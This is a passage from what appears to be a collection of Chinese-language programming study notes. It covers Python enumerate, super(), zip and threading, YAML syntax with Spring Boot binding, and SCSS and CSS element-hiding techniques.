print(i)\n```\n输出：\n(0, 'q')\n(1, 'w')\n(2, 'e')\n(3, 'r')\n\n```python\na=[\"q\",\"w\",\"e\",\"r\"]\n#这里加了个参数2，代表的是start的值\nc=enumerate(a,2)\nfor i in c:\n    print(i)\n```\n输出：\n(2, 'q')\n(3, 'w')\n(4, 'e')\n(5, 'r')\n\nenumerate()函数还有一个重要的用法。\n```python\na=[\"q\",\"w\",\"e\",\"r\"]\n#创建一个空字典\nb=dict()\n#这里i表示的是索引，item表示的是它的值\nfor i,item in enumerate(a):\n    b[i]=item\nprint(b)\n```\n输出：\n{0: 'q', 1: 'w', 2: 'e', 3: 'r'}\n\n# pyton调用父类方法\n## python 2.x\n老式类的方法\n优点：简洁。\n缺点：不能很好的处理菱形继承。因为你可能会调用两次共享基类的构造函数。\n```python\nclass Human(object):\n    def __init__(self, age):\n        self.age = age\n        print \"Human age:%s:\" % age\n\n\nclass Student(Human):\n    def __init__(self, name, age):\n        print \"student\"\n        Human.__init__(self, age)\n```\n新式类方法\n```python\nclass Human(object):\n    def __init__(self, age):\n        self.age = age\n        print \"Human age:%s:\" % age\n\n\nclass Student(Human):\n    def __init__(self, name, age):\n        print \"student\"\n        super(Student, self).__init__(age)\n```\n## python 3.x\npython 3.5之后，super() 等同于 super(<containing classname>, self),不再需要传入这两个参数\n```python\nclass Human(object):\n    def __init__(self, age):\n        self.age = age\n        print(\"Human age:%s:\" % age)\n\n\nclass Student(Human):\n    def __init__(self, name, age):\n        print(\"student\")\n        super().__init__(age)\n```\n\n# NameError name 'reload' is not defined 问题\nPython 解决 ：NameError: name 'reload' is not defined 问题\n解决：NameError: name 'reload' is not defined 问题\n## 对于 Python 2.X：\n```python\nimport sys\nreload(sys)\nsys.setdefaultencoding(\"utf-8\")\n```\n## 对于 <= Python 3.3：\n```python\nimport imp\nimp.reload(sys)\n```\n注意：\n1. Python 3 与 Python 2 有很大的区别，其中Python 3 系统默认使用的就是utf-8编码。\n2. 所以，对于使用的是Python 3 的情况，就不需要sys.setdefaultencoding(\"utf-8\")这段代码。\n3. 最重要的是，Python 3 的 sys 库里面已经没有 setdefaultencoding() 函数了。\n\n## 对于 >= Python 3.4：\n```python\nimport importlib\nimportlib.reload(sys)\n```\n\n# zip()函数\nzip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。\n如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。\nzip 方法在 Python 2 和 Python 3 中的不同：在 Python 3.x 中为了减少内存，zip() 返回的是一个对象。如需展示列表，需手动 list() 转换。\n如果需要了解 Pyhton3 的应用，可以参考 Python3 zip()。\n\n## 语法\nzip 语法：\n\nzip([iterable, ...])\n参数说明：\n\niterabl -- 一个或多个迭代器;\n返回值\n返回元组列表。\n\n## 实例\n以下实例展示了 zip 的使用方法：\n```python\n>>>a = [1,2,3]\n>>> b = [4,5,6]\n>>> c = [4,5,6,7,8]\n>>> zipped = zip(a,b)     # 打包为元组的列表\n[(1, 4), (2, 5), (3, 6)]\n>>> zip(a,c)              # 元素个数与最短的列表一致\n[(1, 4), (2, 5), (3, 6)]\n>>> zip(*zipped)          # 与 zip 相反，*zipped 可理解为解压，返回二维矩阵式\n[(1, 2, 3), (4, 5, 6)]\n```\n\n# 多线程\nPython3 线程中常用的两个模块为：\n- `_thread`\n- threading(推荐使用)\nthread 模块已被废弃。用户可以使用 threading 模块代替。所以，在 Python3 中不能再使用\"thread\" 模块。为了兼容性，Python3 将 thread 重命名为 `\"_thread\"`。\n\nPython中使用线程有两种方式：函数或者用类来包装线程对象。\n函数式：调用 `_thread` 模块中的`start_new_thread()`函数来产生新线程。语法如下:\n```py\n_thread.start_new_thread (function, args[, kwargs] )\n```\n参数说明:\n- function - 线程函数。\n- args - 传递给线程函数的参数,他必须是个tuple类型。\n- kwargs - 可选参数。\n\n实例\n```py\n#!/usr/bin/python3\n\nimport _thread\nimport time\n\n# 为线程定义一个函数\ndef print_time( threadName, delay):\n   count = 0\n   while count < 5:\n      time.sleep(delay)\n      count += 1\n      print (\"%s: %s\" % ( threadName, time.ctime(time.time()) ))\n\n# 创建两个线程\ntry:\n   _thread.start_new_thread( print_time, (\"Thread-1\", 2, ) )\n   _thread.start_new_thread( print_time, (\"Thread-2\", 4, ) )\nexcept:\n   print (\"Error: 无法启动线程\")\n\nwhile 1:\n   pass\n```\n执行以上程序输出结果如下：\n```\nThread-1: Wed Apr  6 11:36:31 2016\nThread-1: Wed Apr  6 11:36:33 2016\nThread-2: Wed Apr  6 11:36:33 2016\nThread-1: Wed Apr  6 11:36:35 2016\nThread-1: Wed Apr  6 11:36:37 2016\nThread-2: Wed Apr  6 11:36:37 2016\nThread-1: Wed Apr  6 11:36:39 2016\nThread-2: Wed Apr  6 11:36:41 2016\nThread-2: Wed Apr  6 11:36:45 2016\nThread-2: Wed Apr  6 11:36:49 2016\n```\n执行以上程后可以按下 ctrl-c 退出。\n\n\n# 线程模块\nPython3 通过两个标准库`_thread`和`threading`提供对线程的支持。\n\n`_thread`提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。\n\nthreading 模块除了包含`_thread`模块中的所有方法外，还提供的其他方法：\n- threading.currentThread(): 返回当前的线程变量。\n- threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。\n- threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。\n\n除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:\n- run(): 用以表示线程活动的方法。\n- start():启动线程活动。\n- `join([time])`: 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。\n- isAlive(): 返回线程是否活动的。\n- getName(): 返回线程名。\n- setName(): 设置线程名。 \n\n## 使用 threading 模块创建线程\n我们可以通过直接从 threading.Thread 继承创建一个新的子类，并实例化后调用 start() 方法启动新线程，即它调用了线程的 run() 方法：\n\n实例\n```py\n#!/usr/bin/python3\n\nimport threading\nimport time\n\nexitFlag = 0\n\nclass myThread (threading.Thread):\n    def __init__(self, threadID, name, counter):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.counter = counter\n    def run(self):\n        print (\"开始线程：\" + self.name)\n        print_time(self.name, self.counter, 5)\n        print (\"退出线程：\" + self.name)\n\ndef print_time(threadName, delay, counter):\n    while counter:\n        if exitFlag:\n            threadName.exit()\n        time.sleep(delay)\n        print (\"%s: %s\" % (threadName, time.ctime(time.time())))\n        counter -= 1\n\n# 创建新线程\nthread1 = myThread(1, \"Thread-1\", 1)\nthread2 = myThread(2, \"Thread-2\", 2)\n\n# 开启新线程\nthread1.start()\nthread2.start()\nthread1.join()\nthread2.join()\nprint (\"退出主线程\")\n```\n\n以上程序执行结果如下；\n```py\n开始线程：Thread-1\n开始线程：Thread-2\nThread-1: Wed Apr  6 11:46:46 2016\nThread-1: Wed Apr  6 11:46:47 2016\nThread-2: Wed Apr  6 11:46:47 2016\nThread-1: Wed Apr  6 11:46:48 2016\nThread-1: Wed Apr  6 11:46:49 2016\nThread-2: Wed Apr  6 11:46:49 2016\nThread-1: Wed Apr  6 11:46:50 2016\n退出线程：Thread-1\nThread-2: Wed Apr  6 11:46:51 2016\nThread-2: Wed Apr  6 11:46:53 2016\nThread-2: Wed Apr  6 11:46:55 2016\n退出线程：Thread-2\n退出主线程\n```\n\n# 线程同步\n如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。\n\n使用 Thread 对象的 Lock 和 Rlock 可以实现简单的线程同步，这两个对象都有 acquire 方法和 release 方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间。如下：\n\n多线程的优势在于可以同时运行多个任务（至少感觉起来是这样）。但是当线程需要共享数据时，可能存在数据不同步的问题。\n\n考虑这样一种情况：一个列表里所有元素都是0，线程\"set\"从后向前把所有元素改成1，而线程\"print\"负责从前往后读取列表并打印。\n\n那么，可能线程\"set\"开始改的时候，线程\"print\"便来打印列表了，输出就成了一半0一半1，这就是数据的不同步。为了避免这种情况，引入了锁的概念。\n\n锁有两种状态——锁定和未锁定。每当一个线程比如\"set\"要访问共享数据时，必须先获得锁定；如果已经有别的线程比如\"print\"获得锁定了，那么就让线程\"set\"暂停，也就是同步阻塞；等到线程\"print\"访问完毕，释放锁以后，再让线程\"set\"继续。\n\n经过这样的处理，打印列表时要么全部输出0，要么全部输出1，不会再出现一半0一半1的尴尬场面。\n```py\n#!/usr/bin/python3\n\nimport threading\nimport time\n\nclass myThread (threading.Thread):\n    def __init__(self, threadID, name, counter):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.counter = counter\n    def run(self):\n        print (\"开启线程： \" + self.name)\n        # 获取锁，用于线程同步\n        threadLock.acquire()\n        print_time(self.name, self.counter, 3)\n        # 释放锁，开启下一个线程\n        threadLock.release()\n\ndef print_time(threadName, delay, counter):\n    while counter:\n        time.sleep(delay)\n        print (\"%s: %s\" % (threadName, time.ctime(time.time())))\n        counter -= 1\n\nthreadLock = threading.Lock()\nthreads = []\n\n# 创建新线程\nthread1 = myThread(1, \"Thread-1\", 1)\nthread2 = myThread(2, \"Thread-2\", 2)\n\n# 开启新线程\nthread1.start()\nthread2.start()\n\n# 添加线程到线程列表\nthreads.append(thread1)\nthreads.append(thread2)\n\n# 等待所有线程完成\nfor t in threads:\n    t.join()\nprint (\"退出主线程\")\n```\n执行以上程序，输出结果为：\n```py\n开启线程： Thread-1\n开启线程： Thread-2\nThread-1: Wed Apr  6 11:52:57 2016\nThread-1: Wed Apr  6 11:52:58 2016\nThread-1: Wed Apr  6 11:52:59 2016\nThread-2: Wed Apr  6 11:53:01 2016\nThread-2: Wed Apr  6 11:53:03 2016\nThread-2: Wed Apr  6 11:53:05 2016\n退出主线程\n```\n"
  },
  {
    "title": "./notes/基础知识/yaml.md",
    "body": "# 什么是YAML\nYAML是\"YAML Ain’t a Markup Language\"（YAML不是一种标记语言）的递归缩写。YAML的意思其实是：“Yet Another Markup Language”（仍是一种标记语言）。主要强度这种语音是以数据为中心，而不是以标记语音为重心，例如像xml语言就会使用大量的标记。\n\nYAML是一个可读性高，易于理解，用来表达数据序列化的格式。它的语法和其他高级语言类似，并且可以简单表达清单（数组）、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件等。\n\nYAML的配置文件后缀为`.yml`，例如Springboot项目中使用到的配置文件 `application.yml` 。\n\n# 基本语法\n- YAML使用可打印的Unicode字符，可使用UTF-8或UTF-16。\n- 数据结构采用键值对的形式，即 `键名称: 值`，注意冒号后面要有空格。\n- 每个清单（数组）成员以单行表示，并用短杠+空白（- ）起始。或使用方括号（[]），并用逗号+空白（, ）分开成员。\n- 每个散列表的成员用冒号+空白（: ）分开键值和内容。或使用大括号（{ }），并用逗号+空白（, ）分开。\n- 字符串值一般不使用引号，必要时可使用，使用双引号表示字符串时，会转义字符串中的特殊字符（例如\\n）。使用单引号时不会转义字符串中的特殊字符。\n- 大小写敏感\n- 使用缩进表示层级关系，缩进不允许使用tab，只允许空格，因为有可能在不同系统下tab长度不一样\n- 缩进的空格数可以任意，只要相同层级的元素左对齐即可\n- 在单一文件中，可用连续三个连字号（—）区分多个文件。还有选择性的连续三个点号（…）用来表示文件结尾。\n- '#'表示注释，可以出现在一行中的任何位置，单行注释\n- 在使用逗号及冒号时，后面都必须接一个空白字符，所以可以在字符串或数值中自由加入分隔符号（例如：5,280或http://www.wikipedia.org）而不需要使用引号。\n\n# 数据类型\n- 纯量（scalars）：单个的、不可再分的值\n- 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）\n- 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）\n\n\n## 标量\n标量是最基础的数据类型，不可再分的值，他们一般用于表示单个的变量，有以下七种：\n\n1. 字符串\n2. 布尔值\n3. 整数\n4. 浮点数\n5. Null\n6. 时间\n7. 日期\n\n```yaml\n# 字符串\nstring.value: Hello!我是陈皮!\n\n# 布尔值，true或false\nboolean.value: true\nboolean.value1: false\n\n# 整数\nint.value: 10\nint.value1: 0b1010_0111_0100_1010_1110 # 二进制\n\n# 浮点数\nfloat.value: 3.14159\nfloat.value1: 314159e-5 # 科学计数法\n\n# Null，~代表null\nnull.value: ~\n\n# 时间，时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区\ndatetime.value: !!timestamp 2021-04-13T10:31:00+08:00\n\n# 日期,日期必须使用ISO 8601格式，即yyyy-MM-dd\ndate.value: !!timestamp 2021-04-13\n```\n\n这样，我们就可以在程序中引入了，如下：\n```java\n@RestController\n@RequestMapping(\"demo\")\npublic class PropConfig {\n\n    @Value(\"${string.value}\")\n    private String stringValue;\n\n    @Value(\"${boolean.value}\")\n    private boolean booleanValue;\n\n    @Value(\"${boolean.value1}\")\n    private boolean booleanValue1;\n\n    @Value(\"${int.value}\")\n    private int intValue;\n\n    @Value(\"${int.value1}\")\n    private int intValue1;\n\n    @Value(\"${float.value}\")\n    private float floatValue;\n\n    @Value(\"${float.value1}\")\n    private float floatValue1;\n\n    @Value(\"${null.value}\")\n    private String nullValue;\n\n    @Value(\"${datetime.value}\")\n    private Date datetimeValue;\n\n    @Value(\"${date.value}\")\n    private Date datevalue;\n}\n```\n\n## 对象\n我们知道单个变量可以用键值对，使用冒号结构表示 key: value，注意冒号后面要加一个空格。可以使用缩进层级的键值对表示一个对象，如下所示：\n```yaml\nperson:\n  name: 陈皮\n  age: 18\n  man: true\n```\n\n然后在程序对这几个属性进行赋值到Person对象中，注意Person类要加get/set方法，不然属性会无法正确取到配置文件的值。使用@ConfigurationProperties注入对象，@value不能很好的解析复杂对象。\n```java\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\n@ConfigurationProperties(prefix = \"person\")\n@Getter\n@Setter\npublic class Person {\n    private String name;\n    private int age;\n    private boolean man;\n}\n```\n\n当然也可以使用`key:{key1: value1, key2: value2, ...}`的形式，如下：\n```yaml\nperson: {name: 陈皮, age: 18, man: true}\n```\n\n## 数组\n可以用短横杆加空格 `-`开头的行组成数组的每一个元素，如下的address字段：\n```yaml\nperson:\n  name: 陈皮\n  age: 18\n  man: true\n  address:\n    - 深圳\n    - 北京\n    - 广州\n```\n也可以使用中括号进行行内显示形式，如下：\n```yaml\nperson:\n  name: 陈皮\n  age: 18\n  man: true\n  address: [深圳, 北京, 广州]\n```\n在代码中引入方式如下：\n```java\nimport lombok.Getter;\nimport lombok.Setter;\nimport lombok.ToString;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.context.annotation.Configuration;\nimport java.util.List;\n\n@Configuration\n@ConfigurationProperties(prefix = \"person\")\n@Getter\n@Setter\n@ToString\npublic class Person {\n    private String name;\n    private int age;\n    private boolean man;\n    private List<String> address;\n}\n```\n\n如果数组字段的成员也是一个数组，可以使用嵌套的形式，如下：\n\n```yaml\nperson:\n  name: 陈皮\n  age: 18\n  man: true\n  address: [深圳, 北京, 广州]\n  twoArr:\n    -\n      - 2\n      - 3\n      - 1\n    -\n      - 10\n      - 12\n      - 30\n```\n\n```java\nimport lombok.Getter;\nimport lombok.Setter;\nimport lombok.ToString;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.context.annotation.Configuration;\nimport java.util.List;\n\n@Configuration\n@ConfigurationProperties(prefix = \"person\")\n@Getter\n@Setter\n@ToString\npublic class Person {\n    private String name;\n    private int age;\n    private boolean man;\n    private List<String> address;\n    private List<List<Integer>> twoArr;\n}\n```\n\n如果数组成员是一个对象，则用如下两种形式形式：\n```yaml\nchilds:\n  -\n    name: 小红\n    age: 10\n  -\n    name: 小王\n    age: 15\n\nchilds: [{name: 小红, age: 10}, {name: 小王, age: 15}]\n```\n\n# 文本块\n如果你想引入多行的文本块，可以使用|符号，注意在冒号:和 |符号之间要有空格。\n```yaml\nperson:\n  name: |\n    Hello Java!!\n    I am fine!\n    Thanks! GoodBye!\n```\n\n它和加双引号的效果一样，双引号能转义特殊字符：\n\n```yaml\nperson:\n  name: \"Hello Java!!\\nI am fine!\\nThanks! GoodBye!\"\n```\n\n# 显示指定类型\n有时我们需要显示指定某些值的类型，可以使用 !（感叹号）显式指定类型。!单叹号通常是自定义类型，!!双叹号是内置类型，例如：\n\n```yaml\n# 指定为字符串\nstring.value: !!str HelloWorld!\n\n# !!timestamp指定为日期时间类型\ndatetime.value: !!timestamp 2021-04-13T02:31:00+08:00\n```\n\n内置的类型如下：\n- !!int：整数类型\n- !!float：浮点类型\n- !!bool：布尔类型\n- !!str：字符串类型\n- !!binary：二进制类型\n- !!timestamp：日期时间类型\n- !!null：空值\n- !!set：集合类型\n- !!omap，!!pairs：键值列表或对象列表\n- !!seq：序列\n- !!map：散列表类型\n\n# 引用\n引用会用到 `&`锚点符合和`*`星号符号，`&`用来建立锚点，`<<` 表示合并到当前数据，`*` 用来引用锚点。\n```yaml\nxiaohong: &xiaohong\n  name: 小红\n  age: 20\n\ndept:\n  id: D15D8E4F6D68A4E88E\n  <<: *xiaohong\n```\n\n上面最终相当于如下：\n```yaml\nxiaohong:\n  name: 小红\n  age: 20\n\ndept:\n  id: D15D8E4F6D68A4E88E\n  name: 小红\n  age: 20\n```\n\n还有一种文件内引用，使用`${}`来引用已经定义好的变量，如下：\n\n```yaml\nbase.host: https://chenpi.com\n\nadd.person.url: ${base.host}/person/add\n```\n\n# 单文件多配置\n可以在同一个文件中，实现多文档分区，即多配置。在一个yml文件中，通过`—`分隔多个不同配置，根据`spring.profiles.active`的值来决定启用哪个配置\n```yaml\n#公共配置\nspring:\n  profiles:\n    active: pro # 指定使用哪个文档块\n\n---\n\n#开发环境配置\nspring:\n  profiles: dev # profiles属性代表配置的名称\n\nserver:\n  port: 8080\n\n---\n\n#生产环境配置\nspring:\n  profiles: pro\n\nserver:\n  port: 8081\n```\n"
  },
  {
    "title": "./notes/基础知识/css.md",
    "body": "# scss快速入门\n在使用scss之前，我们要知道Sass、Scss有什么不同？\nSCSS 是 Sass 3 引入新的语法，其语法完全兼容 CSS3，并且继承了 Sass 的强大功能。也就是说，任何标准的 CSS3 样式表都是具有相同语义的有效的 SCSS 文件\n\n## 准备工作\nscss需要经过编译为css才能被浏览器识别，直接使用webpack进行编译。\n首先安装css-loader、style-loader、node-sass、sass-loader。\n```shell\nnpm install css-loader style-loader --save-dev\nnpm install node-sass sass-loader --save-dev\n```\n然后在webpack.config.js配置文件中添加对应的loader, 如下：\n```conf\n {test: /\\.scss/, use: ['style-loader', 'css-loader','sass-loader']}\n```\n\n## 使用\n### 使用变量\nSCSS中的变量以`$`开头。\n```css\n$border-color:#aaa; //声明变量\n.container {\n$border-width:1px;\n    border:$border-width solid $border-color; //使用变量\n}\n```\n上述例子中定义了两个变量，其中`$border-color`在大括号之外称为全局变量，顾名思义任何地方都可以使用，`$border-width`是在`.container`之内声明的，是一个局部变量，只有.container内部才能使用。\n\n编译后的CSS\n```css\n.container {\n    border:1px solid #aaa; //使用变量\n}\n```\n我们可以把SCSS看做一个模板引擎，编译的过程中用变量的值去替代变量所占据的位置。\ntips:SCSS中变量名使用中划线或下划线都是指向同一变量的，上文中定义了一个变量`$border-color`，这时再定义一个变量`$border_color:#ccc`,他们指向同一个变量，.container的值会被第二次定义的变量覆盖。\n```css\n$border-color:#aaa; //声明变量\n$border_color:#ccc;\n.container {\n    $border-width:1px;\n    border:$border-width solid $border-color; //使用变量\n}\n```\n编译后的CSS\n```css\n.container {\n    border:1px solid #ccc; //使用变量\n}\n```\n这个例子中我们要知道\n（1）变量名使用中划线或下划线都是指向同一变量的。\n（2）后定义的变量声明会被忽略，但赋值会被执行，这一点和ES5中var声明变量是一样的。\n\n### 嵌套规则\n我们先来看一个例子。\n/*css*/\n.container ul {\n    border:1px solid #aaa;\n    list-style:none;\n}\n\n.container ul:after {\n    display:block;\n    content:\"\";\n    clear:both;\n}\n\n.container ul li {\n    float:left;\n}\n\n.container ul li>a {\n    display:inline-block;\n    padding:6px 12px;\n}\n这是一个让列表元素横向排列的例子，我们在这个例子中写了很多重复的代码，.container写了很多遍，下面我将用SCSS简写上面的例子。\n\n#### 嵌套选择器\n```css\n/*scss*/\n.container ul {\n    border:1px solid #aaa;\n    list-style:none;\n    \n    li {\n        float:left;\n    }\n    \n    li>a {\n        display:inline-block;\n        padding:6px 12px;\n    }\n}\n\n.container ul:after {\n    display:block;\n    content:\"\";\n    clear:both;\n}\n```\n这里我们可以将公共的父元素提取出来。\n\n#### 嵌套中的父级选择器\nSCSS提供了一个选择器可以选中当前元素的父元素，使用&表示，下面用父级选择器继续简化代码。\n```css\n/*scss*/\n.container ul {\n    border:1px solid #aaa;\n    list-style:none;\n    \n    li {\n        float:left;\n    }\n    \n    li>a {\n        display:inline-block;\n        padding:6px 12px;\n    }\n    \n    &:after {\n        display:block;\n        content:\"\";\n        clear:both;\n    }\n}\n```\n父级选择器中需要注意，只能在嵌套内部使用父级选择器，否则SCSS找不到父级元素会直接报错。\n在各种伪类选择器中，父级选择器是十分常用的。\n\n#### 嵌套组合选择器\n在嵌套规则中可以写任何css代码，包括群组选择器（,），子代选择器（>），同层相邻组合选择器（+）、同层全体组合选择器（~）等等，下面继续将自带选择器简化掉。\n```css\n/*scss*/\n.container ul {\n    border:1px solid #aaa;\n    list-style:none;\n    \n    li {\n        float:left;\n        \n        >a {\n            display:inline-block;\n            padding:6px 12px;\n        }\n    }\n    \n    &:after {\n        display:block;\n        content:\"\";\n        clear:both;\n    }\n}\n```\n子代选择器可以写在外层选择器右边（如下述例子）也可以写在内层选择器左边（如上述例子）。\n```css\nli >{ \n    a {\n        display:inline-block;\n        padding:6px 12px;\n    }\n}\n```\n写在外层选择器右边时要特别注意，他会作用于所有嵌套的选择器上，尽量不要采用这类写法，我认为扩展性不强，也容易出错。\n\n#### 嵌套属性\n先看一个例子\n```css\n/*css*/\nli {\n    border:1px solid #aaa;\n    border-left:0;\n    border-right:0;\n}\n```\n这个例子中我们只需要两条边框，使用SCSS重写一遍。\n```css\n/*scss*/\nli {\n    border:1px solid #aaa {\n        left:0;\n        right:0;\n    }\n}\n```\nscss识别一个属性以分号结尾时则判断为一个属性，以大括号结尾时则判断为一个嵌套属性，规则是将外部的属性以及内部的属性通过中划线连接起来形成一个新的属性。\n\n## 导入SCSS文件\n大型项目中css文件往往不止一个，css提供了@import命令在css内部引入另一个css文件，浏览器只有在执行到@import语句后才会去加载对应的css文件，导致页面性能变差，故基本不使用。SCSS中的@import命令跟原生的不太一样，后续会讲解到。\n\n### 导入变量的优先级问题-变量默认值\n```css\n/*App1.scss*/\n$border-color:#aaa; //声明变量\n@import App2.scss;  //引入另一个SCSS文件\n.container {\n    border:1px solid $border-color; //使用变量\n}\n```\n```css\n/*App2.scss*/\n$border-color:#ccc; //声明变量\n```\n```css\n/*生成的css文件*/\n.container {\n    border:1px solid #ccc; //使用变量\n}\n```\n这可能并不是我们想要的，有时候我们希望引入的某些样式不更改原有的样式，这时我们可以使用变量默认值。\n```css\n/*App1.scss*/\n$border-color:#aaa; //声明变量\n@import App2.scss;  //引入另一个SCSS文件\n.container {\n    border:1px solid $border-color; //使用变量\n}\n```\n```css\n/*App2.scss*/\n$border-color:#ccc !default; //声明变量\n```\n```css\n/*生成的css文件*/\n.container {\n    border:1px solid #aaa; //使用变量\n}\n```\n导入的文件App2.scss只在文件中不存在`$border-color时起作用`，若App1.scss中已经存在了`$border-color`变量，则App2.scss中的`$border-color`不生效。\n!default只能使用与变量中。\n\n### 嵌套导入\n上一个例子中我们是在全局中导入的App2.scss，现在我们在为App2.scss添加一些内容，并在局部中导入。\n```css\n/*App1.scss*/\n$border-color:#aaa; //声明变量\n.container {\n    @import App2.scss;  //引入另一个SCSS文件\n    border:1px solid $border-color; //使用变量\n}\n```\n```css\n/*App2.scss*/\n$border-color:#ccc !default; //声明变量\np {\n    margin:0;\n}\n```\n```css\n/*生成的css文件*/\n.container {\n    border:1px solid #aaa; //使用变量\n}\n.container p {\n    margin:0;\n}\n```\n可以看得出来，就是将App2.scss中的所有内容直接写入到App1.scss的.container选择器中。\n\n###  使用原生@import\n前面我们说到基本不使用原生@import，但某些情况下我们不得不使用原生@import时了，SCSS也为我们处理了这种情况，直接导入css文件即可。\n```css\n@import 'App.css';\n```\n\n## 注释\nSCSS中的注释有两种\n- `/*注释*/`:这种注释会被保留到编译后的css文件中。\n- `//注释`:这种注释不会被保留到编译后生成的css文件中。\n\n## 混合器（函数）\n### 声明一个函数\n使用@mixin指令声明一个函数，看一下自己的css文件，有重复的代码片段都可以考虑使用混合器将他们提取出来复用。\n```css\n@mixin border-radius{\n    -moz-border-radius: 5px;\n    -webkit-border-radius: 5px;\n    border-radius: 5px;\n    color:red;\n}\n```\n混合器作用域内的属性都是return的值，除此之外，还可以为函数传参数。\n```css\n@mixin get-border-radius($border-radius,$color){\n    -moz-border-radius: $border-radius;\n    -webkit-border-radius: $border-radius;\n    border-radius: $border-radius;\n    color:$color;\n}\n```\n也可以设置混合器的默认值。\n```css\n@mixin get-border-radius($border-radius:5px,$color:red){\n    -moz-border-radius: $border-radius;\n    -webkit-border-radius: $border-radius;\n    border-radius: $border-radius;\n    color:$color;\n}\n```\n### 使用函数\n使用函数的关键字为@include\n```css\n.container {\n    border:1px solid #aaa;\n    @include get-border-radius;         //不传参则为默认值5px\n    @include get-border-radius(10px,blue);   //传参\n}\n/*多个参数时，传参指定参数的名字，可以不用考虑传入的顺序*/\n.container {\n    border:1px solid #aaa;\n    @include get-border-radius;         //不传参则为默认值5px\n    @include get-border-radius($color:blue,$border-radius:10px);   //传参\n}\n```\n我们可能会想到，直接将混合器写成一个class不就行了，但是写成一个class的时候是需要在html文件中使用的，而使用混合器并不需要在html文件中使用class既可达到复用的效果。\ntips:混合器中可以写一切scss代码。\n\n## 继承\n继承是面向对象语言的一大特点，可以大大降低代码量。\n\n### 定义被继承的样式\n```css\n%border-style {\n  border:1px solid #aaa;\n  -moz-border-radius: 5px;\n  -webkit-border-radius: 5px;\n  border-radius: 5px;\n}\n```\n使用%定义一个被继承的样式，类似静态语言中的抽象类，他本身不起作用，只用于被其他人继承。\n\n### 继承样式\n通过关键字@extend即可完成继承。\n```css\n.container {\n\t@extend %border-style;\n}\n```\n上述例子中看不出混合器与继承之间的区别，那么下一个例子可以看出继承与混合器之间的区别。\n```css\n.container {\n\t@extend %border-style;\n\tcolor:red;\n}\n.container1 {   //继承另一个选择器\n\t@extend .container;\n}\n```\n\n## 操作符\nSCSS提供了标准的算术运算符，例如+、-、*、/、%。\n```css\n/*SCSS*/\nwidth: 600px / 960px * 100%;\n/*编译后的CSS*/\nwidth: 62.5%;\n```\n# CSS 隐藏页面元素常用方法\n用 CSS 隐藏页面元素有许多种方法。你可以将 opacity 设为 0、将 visibility 设为 hidden、将 display 设为 none 或者将 position 设为 absolute 然后将位置设到不可见区域。\n## Opacity\nopacity 属性的意思是设置一个元素的透明度。它不是为改变元素的边界框（bounding box）而设计的。这意味着将 opacity 设为 0 只能从视觉上隐藏元素。而元素本身依然占据它自己的位置并对网页的布局起作用。它也将响应用户交互。\n```css\n.hide {\n  opacity: 0;\n}\n```\n如果你打算使用 opacity 属性在读屏软件中隐藏元素，很不幸，你并不能如愿。元素和它所有的内容会被读屏软件阅读，就像网页上的其他元素那样。换句话说，元素的行为就和它们不透明时一致。\n我还要提醒一句，opacity 属性可以用来实现一些效果很棒的动画。任何 opacity 属性值小于 1 的元素也会创建一个新的堆叠上下文（stacking context）。\n\n## Visibility\n第二个要说的属性是 visibility。将它的值设为 hidden 将隐藏我们的元素。如同 opacity 属性，被隐藏的元素依然会对我们的网页布局起作用。与 opacity 唯一不同的是它不会响应任何用户交互。此外，元素在读屏软件中也会被隐藏。\n这个属性也能够实现动画效果，只要它的初始和结束状态不一样。这确保了 visibility 状态切换之间的过渡动画可以是时间平滑的（事实上可以用这一点来用 hidden 实现元素的延迟显示和隐藏——译者注）。\n```csss\n.hide {\n   visibility: hidden;\n}\n```\n下面的例子演示了 visibility 与 opacity 有怎样的不同：\n注意，如果一个元素的 visibility 被设置为 hidden，同时想要显示它的某个子孙元素，只要将那个元素的 visibility 显式设置为 visible 即可（就如例子里面的 .o-hide p——译者注）。尝试只 hover 在隐藏元素上，不要 hover 在 p 标签里的数字上，你会发现你的鼠标光标没有变成手指头的样子。此时，你点击鼠标，你的 click 事件也不会被触发。\n而在 <div> 标签里面的 <p> 标签则依然可以捕获所有的鼠标事件。一旦你的鼠标移动到文字上，<div> 本身变得可见并且事件注册也随之生效。\n\n## Display\ndisplay 属性依照词义真正隐藏元素。将 display 属性设为 none 确保元素不可见并且连盒模型也不生成。使用这个属性，被隐藏的元素不占据任何空间。不仅如此，一旦 display 设为 none 任何对该元素直接打用户交互操作都不可能生效。此外，读屏软件也不会读到元素的内容。这种方式产生的效果就像元素完全不存在。\n任何这个元素的子孙元素也会被同时隐藏。为这个属性添加过渡动画是无效的，它的任何不同状态值之间的切换总是会立即生效。\n不过请注意，通过 DOM 依然可以访问到这个元素。因此你可以通过 DOM 来操作它，就像操作其他的元素。\n```css\n.hide {\n   display: none;\n}\n```\n看下面的例子：\n你将看到第二个块元素内有一个 <p> 元素，它自己的 display 属性被设置成 block，但是它依然不可见。这是 visibility:hidden 和 display:none 的另一个不同之处。在前一个例子里，将任何子孙元素 visibility 显式设置成 visible 可以让它变得可见，但是 display 